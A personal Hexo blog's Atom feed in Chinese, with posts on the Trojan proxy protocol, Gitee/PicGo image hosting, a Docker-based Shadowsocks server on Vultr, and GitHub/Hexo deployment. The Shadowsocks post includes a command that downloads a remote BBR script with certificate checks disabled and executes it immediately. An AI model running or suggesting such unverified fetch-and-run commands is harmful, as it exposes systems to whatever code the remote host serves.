href="https://iyideng.vip/black-technology/cgfw/vpn-ss-ssr-v2ray-trojan-wireguard-bypass-gfw.html">科学上网工具哪个好？一灯不是和尚为您科普VPN/SS/SSR/V2Ray/Xray/Trojan/Trojan-Go和WireGuard的前世今生、区别和关系以及梯子软件的前景</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote><p>本教程仅限于查阅学习资料和从事科研外贸工作的人群，所涉及到的工具资源均来自于互联网，本站对这些资源的可用性、安全性和版权不负有任何责任。如有侵权，请联系我删除。使用过程中，请您务必遵守当地的法律法规。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Trojan-介绍&quot;&gt;&lt;a href=&quot;#Trojan-介绍&quot; class=&quot;headerlink&quot; title=&quot;Trojan 介绍&quot;&gt;&lt;/a&gt;Trojan 介绍&lt;/h2&gt;&lt;p&gt;Trojan，原来多是指特洛伊木马，是一种计算机病毒程序。但是，我们今天所说的Trojan是一种新的科学上网技术，全称为Trojan-GFW，是目前最成功的科学上网伪装技术之一。你可以认为Trojan是V2Ray的“WS+TLS”模式的精简版，速度比V2Ray更快，伪装比V2Ray更逼真，更难以被GFW识别。&lt;br&gt;Trojan工作原理：Trojan通过监听443端口，模仿互联网上最常见的 HTTPS 协议，把合法的Trojan代理数据伪装成正常的 HTTPS 通信，并真正地完整完成的TLS 握手，以诱骗GFW认为它就是 HTTPS，从而不被识别。Trojan处理来自外界的 HTTPS 请求，如果是合法的，那么为该请求提供服务，否则将该流量转交给Caddy、Nginx等 web 服务器，由 Caddy、Nginx 等为其提供网页访问服务。基于整个交互过程，这样能让你的VPS更像一个正常的web服务器，因为Trojan的所有行为均与 Caddy、Nginx等 web 服务器一致，并没有引入额外特征，从而达到难以识别的效果。&lt;br&gt;Trojan-Go是Trojan-GFW的分支项目，对Trojan进行性能优化，并增加不少新功能，Trojan-Go性能和功能均有大幅度的提升，而且支持分流和CDN。&lt;/p&gt;</summary>
    
    
    
    <category term="网络" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="VPN" scheme="http://example.com/tags/VPN/"/>
    
  </entry>
  
  <entry>
    <title>Gitee + PicGo 床图</title>
    <link href="http://example.com/2021/12/19/Gitee-PicGo-%E5%BA%8A%E5%9B%BE/"/>
    <id>http://example.com/2021/12/19/Gitee-PicGo-%E5%BA%8A%E5%9B%BE/</id>
    <published>2021-12-19T08:46:54.000Z</published>
    <updated>2022-01-01T16:39:18.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近搭建好博客，十分开心。当我兴奋地将本地的文章上传后，可悲的事情发生了。图片都没显示出来，显示出来的是<code>![[Pasted image 20211216103159.png]]</code>这样一串markdown格式的图片地址。<br>因为markdown的图片保存的是一个连接图片的链接，无法直接保存图片。<br>后面尝试了<code>聚合床图</code>这种方式上传图片得到床图，但是这种方式提供的免费空间小并且每次文章上传前都必须手动上传修改图片的链接，十分麻烦，免费版还有链接失效，商家倒闭的风险，维护起来十分麻烦。<br>经过查询，发现gitee + PicGo 方法得到的床图比较适合我，不仅有适合存放小型个人博客照片的空间并且安全性有保障，话可以使用插件，在写文章时就可以在直接将文章中的照片转换成床图格式，不需要自己重新修改。</p><span id="more"></span><h2 id="Gitee"><a href="#Gitee" class="headerlink" title="Gitee"></a>Gitee</h2><ol><li>注册一个gite账号<br>网址：<a href="https://gitee.com/">https://gitee.com/</a><br>git用户的注册及ssh设置请自行百度，在此不表</li><li>创建一个仓库<br>点击新建仓库<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191623114.png" alt="新建仓库"><br>填写基本信息<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191627883.png" alt="填写基本信息"><br>进入设置-&gt;私人令牌-&gt;提交<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191631785.png" alt="私人令牌"></li></ol><h2 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h2><ol><li>下载 PicGo<br>网址：<a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></li><li>下载gitee<br>下载该插件：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191637268.png"></li><li>修改床图设置<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191636823.png"></li></ol><blockquote><p>PS：repo 填写的是下面的路径</p></blockquote><p> <img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191639534.png"></p><ol start="4"><li>尝试上传文件</li></ol><h2 id="obsidian-插件"><a href="#obsidian-插件" class="headerlink" title="obsidian 插件"></a>obsidian 插件</h2><p> 打开Obsidian第三方插件，搜索“image auto upload”插件，启动后，打开配置页面，打开自动上传开关。这样当你在Obsidian笔记中插入一个图片时，插件会自动把图片上传到远端的图床。<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191643567.png"></p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191645600.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近搭建好博客，十分开心。当我兴奋地将本地的文章上传后，可悲的事情发生了。图片都没显示出来，显示出来的是&lt;code&gt;![[Pasted image 20211216103159.png]]&lt;/code&gt;这样一串markdown格式的图片地址。&lt;br&gt;因为markdown的图片保存的是一个连接图片的链接，无法直接保存图片。&lt;br&gt;后面尝试了&lt;code&gt;聚合床图&lt;/code&gt;这种方式上传图片得到床图，但是这种方式提供的免费空间小并且每次文章上传前都必须手动上传修改图片的链接，十分麻烦，免费版还有链接失效，商家倒闭的风险，维护起来十分麻烦。&lt;br&gt;经过查询，发现gitee + PicGo 方法得到的床图比较适合我，不仅有适合存放小型个人博客照片的空间并且安全性有保障，话可以使用插件，在写文章时就可以在直接将文章中的照片转换成床图格式，不需要自己重新修改。&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="Blog" scheme="http://example.com/tags/Blog/"/>
    
  </entry>
  
  <entry>
    <title>Vultr + Shadowsocks影梭</title>
    <link href="http://example.com/2021/12/18/Vultr-Shadowsocks%E5%BD%B1%E6%A2%AD/"/>
    <id>http://example.com/2021/12/18/Vultr-Shadowsocks%E5%BD%B1%E6%A2%AD/</id>
    <published>2021-12-18T06:52:09.000Z</published>
    <updated>2022-01-01T16:44:35.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Vultr"><a href="#Vultr" class="headerlink" title="Vultr"></a>Vultr</h2><p>创建一个vps，使用Centos7系统<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112271100961.png" alt="创建VPS"></p><span id="more"></span><h2 id="VPN-部署"><a href="#VPN-部署" class="headerlink" title="VPN 部署"></a>VPN 部署</h2><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><blockquote><p>yum install docker -y</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506558.png"></p><h3 id="启动Docker"><a href="#启动Docker" class="headerlink" title="启动Docker"></a>启动Docker</h3><blockquote><p>service docker start</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506591.png"></p><blockquote><p>chkconfig docker on</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506621.png"></p><p>检查Docker 状态</p><blockquote><p>docker version</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506653.png"></p><p>安装 Shadowsocks 的 VPN Docker 镜像</p><blockquote><p>docker pull imhang/shadowsocks-docker<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506689.png"></p></blockquote><p>运行镜像</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --restart=always -e <span class="string">&quot;SS_PORT=443&quot;</span> -e <span class="string">&quot;SS_PASSWORD=VPS_is_c@@1&quot;</span> -e <span class="string">&quot;SS_METHOD=chacha20-ietf-poly1305&quot;</span> -e <span class="string">&quot;SS_TIMEOUT=600&quot;</span> -p <span class="number">443</span>:<span class="number">443</span> -p <span class="number">443</span>:<span class="number">443</span>/udp --name ssserver imhang/shadowsocks-docker</span><br></pre></td></tr></table></figure><ul><li>  SS_PASSWORD= 这里是密码，比如案例的密码是 VPS_is_c@@1</li><li>  SS_METHOD 是加密方式，建议用一些不常见的比如 salsa20 或者 chacha20 等，更不容易被识别</li><li>  SS_PORT 这里是<strong>服务器端口号</strong>，比如案例的端口号是443</li></ul><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506730.png"></p><h2 id="连接ss"><a href="#连接ss" class="headerlink" title="连接ss"></a>连接ss</h2><p>使用ss客户端进行连接即可</p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506771.png"></p><h2 id="BBR-加速"><a href="#BBR-加速" class="headerlink" title="BBR 加速"></a>BBR 加速</h2><h3 id="更新-yum-源"><a href="#更新-yum-源" class="headerlink" title="更新 yum 源"></a>更新 yum 源</h3><blockquote><p>yum update</p></blockquote><h3 id="安装bbr"><a href="#安装bbr" class="headerlink" title="安装bbr"></a>安装bbr</h3><h4 id="检查内核版本"><a href="#检查内核版本" class="headerlink" title="检查内核版本"></a>检查内核版本</h4><p>开启 BBR 要求 4.10 以上版本 Linux 内核，可使用如下命令查看当前内核版本</p><blockquote><p>uname -r</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506808.png"></p><h4 id="更新内核版本"><a href="#更新内核版本" class="headerlink" title="更新内核版本"></a>更新内核版本</h4><p>如果当前内核版本低于 4.10，可使用 <a href="http://elrepo.org/tiki/tiki-index.php">ELRepo</a> 源更新</p><h4 id="安装部署bbr"><a href="#安装部署bbr" class="headerlink" title="安装部署bbr"></a>安装部署bbr</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget –no-check-certificate [https:<span class="comment">//github.com/teddysun/across/raw/master/bbr.sh](https://github.com/teddysun/across/raw/master/bbr.sh) &amp;&amp; chmod +x bbr.sh &amp;&amp; ./bbr.sh</span></span><br></pre></td></tr></table></figure><h3 id="检测bbr"><a href="#检测bbr" class="headerlink" title="检测bbr"></a>检测bbr</h3><blockquote><p>uname -r</p><p>sysctl net.ipv4.tcp_available_congestion_control 【返回 reno cubic bbr】</p><p>sysctl net.ipv4.tcp_congestion_control【返回 bbr】</p><p>sysctl net.core.default_qdisc【返回pfifo_fast】</p><p>lsmod | grep bbr【返回 tcp_bbr模块】</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506852.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>如果内核升级不理解可以查看：<a href="https://www.jianshu.com/p/62c9b9570c05">内核升级</a><br>参考文章：<a href="https://medium.com/vkuajing/vpn%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B-%E5%A4%96%E8%B4%B8%E7%BF%BB%E5%A2%99%E6%95%99%E7%A8%8B-%E8%B6%85%E8%AF%A6%E7%BB%86-%E6%9C%80%E6%96%B0%E7%89%88-2020-2%E6%9C%88%E6%9B%B4%E6%96%B0-2054e5f86af9">vpn搭建教程-外贸翻墙教程-超详细-最新版-2020-2月更新</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Vultr&quot;&gt;&lt;a href=&quot;#Vultr&quot; class=&quot;headerlink&quot; title=&quot;Vultr&quot;&gt;&lt;/a&gt;Vultr&lt;/h2&gt;&lt;p&gt;创建一个vps，使用Centos7系统&lt;br&gt;&lt;img src=&quot;https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112271100961.png&quot; alt=&quot;创建VPS&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="网络" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="VPN" scheme="http://example.com/tags/VPN/"/>
    
  </entry>
  
  <entry>
    <title>Github + Hexo 部署博客</title>
    <link href="http://example.com/2021/12/18/Github%20+%20Hexo%20%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/2021/12/18/Github%20+%20Hexo%20%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/</id>
    <published>2021-12-17T17:40:24.000Z</published>
    <updated>2022-01-01T16:40:26.920Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境需求"><a href="#环境需求" class="headerlink" title="环境需求"></a>环境需求</h2><ul><li>git</li><li>GitHub账号</li><li>Node.Js</li><li>Hexo</li></ul><h2 id="Git-环境"><a href="#Git-环境" class="headerlink" title="Git 环境"></a>Git 环境</h2><p>官网：<a href="https://git-scm.com/">https://git-scm.com</a><br>可以下载桌面版或命令版，根据自身情况进行下载，新手推荐桌面版。</p><span id="more"></span><h2 id="Node-js-环境"><a href="#Node-js-环境" class="headerlink" title="Node.js 环境"></a>Node.js 环境</h2><p>官网：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br>直接下载稳定版或最新版</p><h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><h3 id="1-注册一个git-账号"><a href="#1-注册一个git-账号" class="headerlink" title="1. 注册一个git 账号"></a>1. 注册一个git 账号</h3><h3 id="2-创建一个-repository-仓库"><a href="#2-创建一个-repository-仓库" class="headerlink" title="2. 创建一个 repository(仓库)"></a>2. 创建一个 repository(仓库)</h3><p>仓库名使用：xxx.github.io (xxx为你的用户名)<br><img src="https://pic.imgdb.cn/item/61bead3e2ab3f51d91749c25.jpg"></p><h3 id="3-导入ssh"><a href="#3-导入ssh" class="headerlink" title="3.  导入ssh"></a>3.  导入ssh</h3><p>为什么要配置这个呢？因为你提交代码肯定要拥有你的github权限才可以，但是直接使用用户名和密码太不安全了，所以我们使用ssh key来解决本地和服务器的连接问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/. ssh #检查本机已存在的ssh密钥</span><br></pre></td></tr></table></figure><p>如果提示：No such file or directory 说明你是第一次使用git。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span></span><br></pre></td></tr></table></figure><p>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p><p><img src="http://image.liuxianan.com/201608/20160818_143914_495_9084.png"></p><p>将刚复制的内容粘贴到key那里，title随便填，保存。</p><h3 id="4-创建本地git文件夹"><a href="#4-创建本地git文件夹" class="headerlink" title="4. 创建本地git文件夹"></a>4. 创建本地git文件夹</h3><p>创建一个空的文件夹作为你的git本地文件夹就好了</p><h2 id="Hexo-环境"><a href="#Hexo-环境" class="headerlink" title="Hexo 环境"></a>Hexo 环境</h2><p>官网： <a href="http://hexo.io/">http://hexo.io</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>创建一个空的文件夹，作为存放代码的位置。<br>在该目录下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml # 网站的配置信息，您可以在此配置大部分的参数。 </span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds # 模版文件夹</span><br><span class="line">├── source  # 资源文件夹，除 _posts 文件，其他以下划线_开头的文件或者文件夹不会被编译打包到public文件夹</span><br><span class="line">|   ├── _drafts # 草稿文件</span><br><span class="line">|   └── _posts # 文章Markdowm文件 </span><br><span class="line">└── themes  # 主题文件夹</span><br></pre></td></tr></table></figure><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><h3 id="开启本地预览服务"><a href="#开启本地预览服务" class="headerlink" title="开启本地预览服务"></a>开启本地预览服务</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>开启后我们就可以通过hostlocal:4000查看网页的内容，不过是在本地的。<br>PS:CTRL + C 退出</p><h3 id="修改-conf-yum-文件"><a href="#修改-conf-yum-文件" class="headerlink" title="修改 _conf.yum 文件"></a>修改 _conf.yum 文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">theme: ayer #主题名</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="attr">deploy</span>:</span><br><span class="line"></span><br><span class="line"> type: git</span><br><span class="line"></span><br><span class="line"> <span class="attr">repository</span>:  https:<span class="comment">//github.com/MikeyNing/MikeyNing.github.io.git</span></span><br><span class="line"></span><br><span class="line"> branch: main</span><br></pre></td></tr></table></figure><p> repository 可以在GitHub直接复制<br> <img src="https://pic.imgdb.cn/item/61beae1e2ab3f51d9174d9b3.jpg"></p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h2 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>部署成功后，可以使用 xxx.github.io 进入自己的博客网站查看。如果没有变化，可以尝试 </p><ol><li> 使用git上传更新的文件 </li><li> <code>hexo f</code> 再 <code>hexo d</code></li></ol><h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><p>GitHub上搜索 Hexo theme ，找到喜欢的主题，根据提示进行下载部署，并且修改 _conf.yum 中的主题名。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;环境需求&quot;&gt;&lt;a href=&quot;#环境需求&quot; class=&quot;headerlink&quot; title=&quot;环境需求&quot;&gt;&lt;/a&gt;环境需求&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;git&lt;/li&gt;
&lt;li&gt;GitHub账号&lt;/li&gt;
&lt;li&gt;Node.Js&lt;/li&gt;
&lt;li&gt;Hexo&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Git-环境&quot;&gt;&lt;a href=&quot;#Git-环境&quot; class=&quot;headerlink&quot; title=&quot;Git 环境&quot;&gt;&lt;/a&gt;Git 环境&lt;/h2&gt;&lt;p&gt;官网：&lt;a href=&quot;https://git-scm.com/&quot;&gt;https://git-scm.com&lt;/a&gt;&lt;br&gt;可以下载桌面版或命令版，根据自身情况进行下载，新手推荐桌面版。&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="Blog" scheme="http://example.com/tags/Blog/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/12/18/hello-world/"/>
    <id>http://example.com/2021/12/18/hello-world/</id>
    <published>2021-12-17T17:10:10.000Z</published>
    <updated>2022-01-01T16:51:13.928Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
